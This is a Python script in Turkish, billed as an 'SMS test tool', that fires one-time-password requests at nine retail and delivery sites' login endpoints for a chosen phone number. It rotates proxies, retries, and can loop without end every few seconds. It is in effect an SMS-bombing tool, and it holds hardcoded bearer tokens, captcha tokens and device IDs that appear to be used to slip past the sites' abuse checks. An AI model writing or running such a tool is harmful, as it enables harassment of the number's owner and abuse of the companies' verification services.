#!/usr/bin/env python3
"""
SMS Test Aracı - Tüm Siteler Aktif, Proxy Retry, Hızlı
Kullanım: python3 main.py 5413159398 -l -d 3 -p proxy.txt
"""

import requests
import sys
import random
import time
import signal
from colorama import Fore, Style, init

init(autoreset=True)

# ==================== PROXY YÜKLEYİCİ ====================
def load_proxies(file_path):
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            if not proxies:
                print(f"{Fore.YELLOW}[!] Proxy dosyası boş.{Style.RESET_ALL}")
                return []
            print(f"{Fore.GREEN}[+] {len(proxies)} proxy yüklendi.{Style.RESET_ALL}")
            return proxies
    except:
        return []

def get_random_proxy(proxy_list):
    if proxy_list:
        proxy = random.choice(proxy_list)
        return {'http': proxy, 'https': proxy}
    return None

# ==================== TÜM SİTELER (HEPSİ AKTİF) ====================
SITES = {
    "Kahve Dünyası": {
        "url": "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
        "headers": {
            "Content-Type": "application/json",
            "X-Language-Id": "tr-TR",
            "X-Client-Platform": "web",
            "Origin": "https://www.kahvedunyasi.com",
            "Referer": "https://www.kahvedunyasi.com/login"
        },
        "payload": {"phoneNumber": "{phone}", "countryCode": "90"},
        "is_form_data": False,
        "success_check": {"key": "processStatus", "value": "Success"}
    },
    "A101": {
        "url": "https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/{phone_full}?__culture=tr-TR&__platform=web",
        "headers": {
            "a101-user-agent": "web-2.4.5",
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "installationid": "e40b3c0b6911e08e91c7a12d172332ec",
            "origin": "https://www.a101.com.tr",
            "referer": "https://www.a101.com.tr/"
        },
        "payload": {},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Migros": {
        "url": "https://www.migros.com.tr/rest/user-bff/auth/single-login/otp?reid=1782247326749000001",
        "headers": {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.migros.com.tr",
            "referer": "https://www.migros.com.tr/?utm_source=chatgpt.com",
            "x-cf-captcha-token": "1.rTy4iSq0B0O61cje8vtim6vGmT0J3nq6nYej8R4eIAm7UABmVF12cIebnL9PD0Xkcv-1WnI3ft4fexbv0JrJ5UtbhjZCGTaIrQEIoaF6dhc3mr6McIcym9_UoYsD0pXah167vwsBGD73UOb4dBdwmCv5RrY7p5ixBYUuydJ0ViCrK6DeDUR5D3kA2mDgVpCwuiLo6dw9nHsRmw1vraMKDHXB12qQQi-gsRjkgCNZo3sCPaUwn-Deeeys_-U4QYVMoomxDmFbWdlxuzhuVVhiGOkX2F4kkaj-4b86q9F-Nzm8bFjOlkvYaCwE6Xty8aGUZWn6EfzZArOe-zc1WlXoBCO3GS6lYYO30yWGe9rjdld4CIeYigfFqIeByE3R3eqRTBAktswqLcR2q9gYPOz0v9TSrpHT-sgcTzL-k6Q69Em3SEKNdiMo7Pj-GsqYiv-fibyoLmyzdcGkpKQ5fRtPGRVoD6LUowAavLMnRRmM9NDnutudXOewA0_Lfa1NcHC0SH53VN8djyIkEKiP7rFgazLQ7iYjRrwz2idiUJL8nylqc9qhnlCvAjeg_TD6isqOSXidOUK15sSqxrnJCW3DygIKfbkYtSdWPbCSNkflFHnsGRVt9CSlYJMnCmfH2TS1SLBM_zsqccvE-quB-ZaS2A.pq87UNYuFxckEYa6uu6FXw.29727183b871688e352b29d2b9e8c485df75da96290919ea55754f7663a0874f",
            "x-device-pwa": "true",
            "x-pwa": "true"
        },
        "payload": {"phoneNumber": "{phone}"},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Pınar Online": {
        "url": "https://api.pinar.retter.io/3cn87h0si/INSTANCE/MsisdnAuthenticator?__culture=en-us&__platform=WEB",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.pinaronline.com",
            "referer": "https://www.pinaronline.com/"
        },
        "payload": {"msisdn": "{phone_full}", "loginType": "individual"},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Cepteşok": {
        "url": "https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://giris.ec.sokmarket.com.tr",
            "referer": "https://giris.ec.sokmarket.com.tr/otp-register",
            "x-ecommerce-deviceid": "877e1910-7647-4238-987e-1b6c1a8e3c34-fcd7b70b-8486-4108-a86d-dfb863843755",
            "x-ecommerce-sid": "35151fb0-655b-4a81-8588-74f0f674b7a8-2c18d76e-4b52-445f-b917-80e84443c053"
        },
        "payload": {
            "clientId": "buyer-web",
            "phoneNumber": "{phone}",
            "captchaToken": "",
            "captchaAction": "generate_register_otp",
            "reCaptchaV2": False
        },
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Rappi": {
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "headers": {
            "accept": "application/json",
            "authorization": "Bearer ft.gAAAAABqOuUUyy4TTsvBuH_vLhqUUzd2DzM7XEPaPYxnPTP1OgK_VQXFbPlfUjIYgmEiobMysTo0GAzRQG3cydjN5CsuPszPFAxshngCWzQ3dNd_QCGN2aJhcAtKA8c6qKWRR20zFBPn1UNGM1_jlmLgsDsmkWXAEJmG5WQDnVoQ6UDeM8lk4XMganYyiDvPovSJOkyV3vz77MxB0KZEryGmVfMhBn5uGrq1FwY8yCwIxwHTR7tvcuavQbCP86JvI08ODOjekdjrprzJxm3oEyIELOCmd25VCxkVbZX8coFtmTXqDOc6lWDmqqFNfCi63qcQMtuEOz6Ut0aTlUaHJ3JiSayOh7EA1INjmm1RDw31zARXjoW_dxBiARdUhw73XCOHYQH1Oe50dHZiEfQpY5WeIcfjwLcwag==",
            "content-type": "application/json",
            "deviceid": "a70baf0e-04d6-43ad-9b9a-e5ea745d1179",
            "origin": "https://www.rappi.com.mx",
            "referer": "https://www.rappi.com.mx/"
        },
        "payload": {"country_code": "+90", "phone": "{phone}"},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Tiklagelsin": {
        "url": "https://api.tiklagelsin.com/tg/user/api/v1/auth/generate-otp",
        "headers": {
            "accept": "application/json;charset=utf-8",
            "app-version": "4.0.0",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkaWQiOiJhNTgyNDZlNi03ODRjLTQ2NGUtOGIxNi0yY2ZkNDczYTExMjgiLCJuYmYiOjE3ODIyNDczMDIsImV4cCI6MTgxMzc4MzMwMiwiaWF0IjoxNzgyMjQ3MzAyLCJpc3MiOiJJc3N1ZXJJbmZvcm1hdGlvbiIsImF1ZCI6IkF1ZGllbmNlSW5mb3JtYXRpb24ifQ.AKM_5KAaTocQubvZ4mLREnxHgjUdcQYsFKAdI8Kn-vA",
            "content-type": "application/json",
            "device-type": "2",
            "language": "tr-TR",
            "origin": "https://www.tiklagelsin.com",
            "tenant-id": "9737ce1e-8d97-431c-b884-3250781af72f",
            "timezone": "Europe/Istanbul"
        },
        "payload": {"phoneNumber": "{phone}", "countryCode": "+90", "secret": "{phone}"},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Letgo": {
        "url": "https://www.letgo.com/api/auth/challenges",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.letgo.com",
            "referer": "https://www.letgo.com/?utm_source=chatgpt.com"
        },
        "payload": {"descriptor": "{phone_full}", "type": "phone", "source": "LOGIN"},
        "is_form_data": False,
        "success_check": {"key": "success", "value": True}
    },
    "Gardrops": {
        "url": "https://web.gardrops.com/member/otp/send",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "origin": "https://www.gardrops.com",
            "referer": "https://www.gardrops.com/"
        },
        "data": {
            "phone": "{phone}",
            "isResendRequest": "false",
            "recaptchaToken": "0cAFcWeA4b_JCoeNCklDKPFGa52PT4MU3kQG1meNQxL7459i39XEH5PJAhQ2VH8rKyNPY5dKw_bWbnYP4jwCnqiIJGY-5nx9uAuuBJWjzzgCtulw4Wzy7KtRWTNRh0Lr1vhNclZ3FohXiJ7kKCwCN_CQqur9-ctobkTWQo9LbzLSAEp7TXzI2ujLUnMeu3q7a7pwgZCVWJBYsTRLKRxfOOguCCVqrhVAKkIB-z_rWLa8W3qsDiTu8r6uN0xqcI7OxBn8ZGuzRUMsPNW_vWN9v5cSfT9J3mSejCK_axkSa-AVNGyxO4uOAhXZZMdMqCMoxyLmW7b2JS9qlzALr0CmiVPxFOEc22-xI3HYtnF_GCNMrs0rgdZxMLx_Q2pudMViOddCVVILSHrEl2RlHkpEgv0Hl6cMMiUjgW4pPOAC9pVxOzJekctGOtVHWhjv8rpgDGdqdWGJYgEMr0pHkfKjM6l0U3D7g5V-euiWM0CdYtP1Uxb1A3K5WIZG5THYeIkGJR8mJYTm2lJg9GQfwUjbKTrzKMYlbsEdfsYrDnehN_c-6KkR3l5Flqlytf9RyPo4HTCt0ld49fmgtmBj7XRnLLagdz6BYS0NIj1WzdOqpXcOXVGVeJcXs77hHHwYaI_RJygO1wi4X97V0i_zZ61vy3zyeO-_v69kFb5t44ris1_KfOghroc3e9lw52KRVir0cKW3QQ-dAcjY7FzXaDMSvOw1nb17C_ksvTE1uiyGd4VSYlddiqs-cr83UZOefgIu1VMzgStoSI_PF46JWTGPvaXPQKLyVSOTYCkKTlMX4XoV6X9ZKBdmN77PyaPgUldKPxqARe_5b34T7PbTwWmG8vfuo32e-46Anc_L1yJKrpWrs9DAZY3-GuaZPGrPLmE4wbmCWrqU_XawyOe4lvZJCiqBxgehjRwHKKt2kQebY1T8awOWi_zFwt82q8XwQNSaCU_ajiPWC3knKR-6HVev0iDqdxYg2ene-KcczYP-oL_S--gLbOW2Y7ibGOUq_qBNn7QrO8XZGS8TGTHPnsZI_Ik97lR-hYu8mIp67eDQDDL2RtJpdaB7NvtUpzLWLvZZER05doK4fzgS9emS7IL6tMf39v0kR5zd-_LHR_Aph1K9fouX3GI47pJv9fxTz5UNJqiEAy8fNcpewE_kPmpR2EU8tkpXVomHTYrJiMhWldPPH6BXOfDhrhTCV6htA6TqVVFV7su5SHp25FFp8tx1Y6JdhQtZ8NAa6rk5OpOhBlO8DvXbVlCelcH905Lmh2Jwss3wBWV1GlSQc7b7NPiQiwSSfFESHTwoHHWXvnyqpzEgen-z9qVpqtLNp3Csv8gsON2R_nrPG6YR3nIZWJnswrvAUQE7JxYKh740gd0fRrFOxENL0W_upZzP8yR09Uo4FYlld8jIkc-nI6OQvR38pcjwlt9ODFKfrJ_KECPnFZ4hQgSVdOygWOqbCIUZrwm_LzV6SSPztJTrV0sN7inGT1FKmJ0oUAvsALPTG3L0V5kZboUbBkdJ7b0XhruhwGVOSTIhsm5E_RQY_kJQFSggh_GiZAxtwA9KrVISFUx9fmwH5RTH8B0ulwZAPlqBH-EgW_Z1qO5PJd1jczr_sq3zcw5gkKOYuhB-CNQWIAUleY5QqPA95K2BStRKerlS4_30iLRqBzXJ57rpG1zA7NJd9n86jzk3yRE_jdB5HZA7GoFsIOf8wKckoFRppx2WuQNAhRRPquHIIcb_RUlVSwEPyNY9jtNsg8IvOwM_yo6oP5MHbPDw0Vr5a7H5ldvNszwhU2KLRrDTYD8tF6b8bnH5P-8N85rFD7tE9uDr5vYa_X6_nuW1zpkwWF-6zGiP6Xyitwx3p4i_vNdPiobIwQLmuy0Z2e-kRWi3ycaPAlZyqAKqvICiEe5Xpcl7QOyNXYx-k2xx6d353M_ja7D5-Gb0vbGzD460GfgxrSh_yrabzxYGYxoz6Y7PdhZCrfLV710ghGmzEhAPP_2-rnc8yQ4HPXc8JyNB51BrKDkrOwp1ikHMvaLnME1OjZ2DiTrvLJu9lrW5MHOgFE-r842z7i2Gyaq5mTEGmNlJLT4VarhxsHUk-MnM0d02dgqWtUOztsi9IEWas9o0LfkaNWxt6z3HsNcww4Ehju4LcYZg2283iE3g_Nv7vbutxwHwY"
        },
        "is_form_data": True,
        "success_check": {"key": "success", "value": True}
    }
}

# ==================== BİR SİTEYİ PROXY DENEMELİ TEST ET ====================
def test_single_site(name, config, phone, proxy_list, retries=3):
    phone_clean = phone.replace("+90", "").replace("-", "").strip()
    phone_full = f"+90{phone_clean}" if not phone_clean.startswith("+") else phone_clean
    
    url = config["url"].replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
    headers = config["headers"].copy()
    
    if config.get("is_form_data"):
        data = {}
        for k, v in config["data"].items():
            data[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
        payload = data
    else:
        payload = {}
        for k, v in config["payload"].items():
            if isinstance(v, str):
                payload[k] = v.replace("{phone}", phone_clean).replace("{phone_full}", phone_full)
            else:
                payload[k] = v
    
    # Deneme döngüsü (farklı proxy'lerle)
    attempted = 0
    used_proxies = set()
    last_error = None
    
    while attempted < retries:
        proxy = None
        if proxy_list:
            available = [p for p in proxy_list if p not in used_proxies]
            if not available:
                break
            proxy_raw = random.choice(available)
            used_proxies.add(proxy_raw)
            proxy = {'http': proxy_raw, 'https': proxy_raw}
        
        try:
            if config.get("is_form_data"):
                r = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=6)
            else:
                r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=6)
            
            # Başarı kontrolü
            success = False
            try:
                data = r.json()
                check = config.get("success_check")
                if check and data.get(check["key"]) == check["value"]:
                    success = True
            except:
                if r.status_code == 200:
                    success = True
            
            if success:
                return True, "OK"
            else:
                # Yanıt başarısız ama HTTP hata değil, bu durumda proxy çalışıyor ama site başarısız
                return False, f"Yanıt: {r.status_code} - {r.text[:50]}"
        except (requests.exceptions.ProxyError, requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            last_error = str(e)
            attempted += 1
            continue
        except Exception as e:
            last_error = str(e)
            attempted += 1
            continue
    
    return False, f"Proxy/HTTP Hata: {last_error[:30]}"

# ==================== ANA TEST FONKSİYONU ====================
def test_all_sites(phone, proxy_list, delay):
    phone_clean = phone.replace("+90", "").replace("-", "").strip()
    phone_full = f"+90{phone_clean}" if not phone_clean.startswith("+") else phone_clean
    
    print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 Test: {phone_full} (Döngü arası: {delay}s){Style.RESET_ALL}")
    print(f"{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}\n")
    
    success_list = []
    failure_list = []
    
    for name, config in SITES.items():
        print(f"{Fore.YELLOW}[*] {name} test ediliyor...{Style.RESET_ALL}", end=" ")
        
        success, msg = test_single_site(name, config, phone, proxy_list, retries=3)
        
        if success:
            print(f"{Fore.GREEN}✅ BAŞARILI!{Style.RESET_ALL}")
            success_list.append(name)
        else:
            print(f"{Fore.RED}❌ BAŞARISIZ ({msg}){Style.RESET_ALL}")
            failure_list.append(name)
        
        time.sleep(0.3)
    
    # Özet
    print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Başarılı: {len(success_list)}{Style.RESET_ALL}")
    for s in success_list:
        print(f"  • {s}")
    if failure_list:
        print(f"{Fore.RED}❌ Başarısız: {len(failure_list)}{Style.RESET_ALL}")
        for f in failure_list:
            print(f"  • {f}")
    
    if success_list:
        with open("onaylananlar.txt", "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {phone_full}\n")
            for s in success_list:
                f.write(f"  • {s}\n")
            f.write("\n")
        print(f"\n{Fore.GREEN}✅ Log kaydedildi.{Style.RESET_ALL}")
    
    return success_list, failure_list

# ==================== ANA PROGRAM ====================
def main():
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║     SMS TEST ARACI - TÜM SİTELER AKTİF v3.2            ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    loop_mode = False
    delay = 3
    proxy_file = None
    phone = None
    
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ("-l", "--loop"):
            loop_mode = True
        elif arg in ("-d", "--delay"):
            if i+1 < len(sys.argv):
                try:
                    delay = int(sys.argv[i+1])
                    if delay < 1: delay = 1
                    elif delay > 10: delay = 10
                except: pass
                i += 1
        elif arg in ("-p", "--proxy"):
            if i+1 < len(sys.argv):
                proxy_file = sys.argv[i+1]
                i += 1
        else:
            if phone is None and (arg.startswith("5") or arg.startswith("0") or arg.startswith("+")):
                phone = arg
        i += 1
    
    if not phone:
        phone = input(f"{Fore.YELLOW}📱 Numara (örn: 55555555): {Style.RESET_ALL}").strip()
        if not phone:
            print(f"{Fore.RED}❌ Geçerli numara girin.{Style.RESET_ALL}")
            sys.exit(1)
    
    proxy_list = load_proxies(proxy_file) if proxy_file else []
    
    def signal_handler(sig, frame):
        print(f"\n{Fore.YELLOW}⚠️ Durduruldu.{Style.RESET_ALL}")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    
    if loop_mode:
        print(f"{Fore.CYAN}🔄 Döngü modu. Her {delay} saniye...{Style.RESET_ALL}")
        counter = 1
        while True:
            print(f"\n{Fore.CYAN}══════════════════════════════════════════════════{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🔄 Döngü #{counter}{Style.RESET_ALL}")
            test_all_sites(phone, proxy_list, delay)
            counter += 1
            print(f"\n{Fore.YELLOW}⏳ {delay} saniye bekleniyor...{Style.RESET_ALL}")
            time.sleep(delay)
    else:
        test_all_sites(phone, proxy_list, delay)

if __name__ == "__main__":
    main()
